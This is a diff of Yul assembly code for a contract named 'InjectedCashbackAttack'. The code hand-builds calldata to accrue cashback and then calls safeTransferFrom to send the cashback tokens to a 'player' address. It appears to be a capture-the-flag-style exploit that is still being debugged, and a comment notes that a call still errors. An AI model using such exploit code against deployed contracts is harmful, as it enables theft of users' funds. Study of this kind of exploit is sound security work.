@@ -29,7 +29,7 @@ object "InjectedCashbackAttack" {
                 datacopy(ptr, dataoffset("accrueCashbackSel"), 4)
                 mstore(add(ptr, 4), currency)
                 mstore(add(ptr, 36), expenseAmt)
-                // total calldata size = 4 (selector) + 32 bytes (addr) + 32 bytes (uint256) = 68
+                // 4 (selector) + 32 bytes (addr) + 32 bytes (uint256) = 68
                 let calldataSize := 68
 
                 // Calling cashback.accrueCashback()
@@ -44,17 +44,21 @@ object "InjectedCashbackAttack" {
                 )
                 require(success)
 
-                // Calling safeTransferFrom(address,address,uint256,uint256,bytes)
-                // cashback.safeTransferFrom(address(this), player, nativeAmt, CurrencyLibrary.NATIVE_CURRENCY.toId(), "");
+                // bump free memory pointer
+                mstore(0x40, add(ptr, calldataSize))
+
+                // Calling safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes)
                 ptr := mload(0x40)
                 datacopy(ptr, dataoffset("safeTransferFromSel"), 4)
-                mstore(add(ptr, 4), cashbackAddr)  // contract
-                mstore(add(ptr, 36), player)       // player
-                mstore(add(ptr, 98), cashbackAmt)
-                mstore(add(ptr, 130), currencyId)  // currencyId
-                mstore(add(ptr, 162), 0)
-                calldataSize := 194
+                mstore(add(ptr, 4), address())     // from: self
+                mstore(add(ptr, 36), player)       // to: player
+                mstore(add(ptr, 68), currencyId)   // id: currencyId
+                mstore(add(ptr, 100), cashbackAmt)
+                mstore(add(ptr, 132), 0xa0)        // byte offset
+                mstore(add(ptr, 164), 0)
+                calldataSize := 196
 
+                // nx: this call has error
                 success := call(
                     gas(),
                     cashbackAddr,
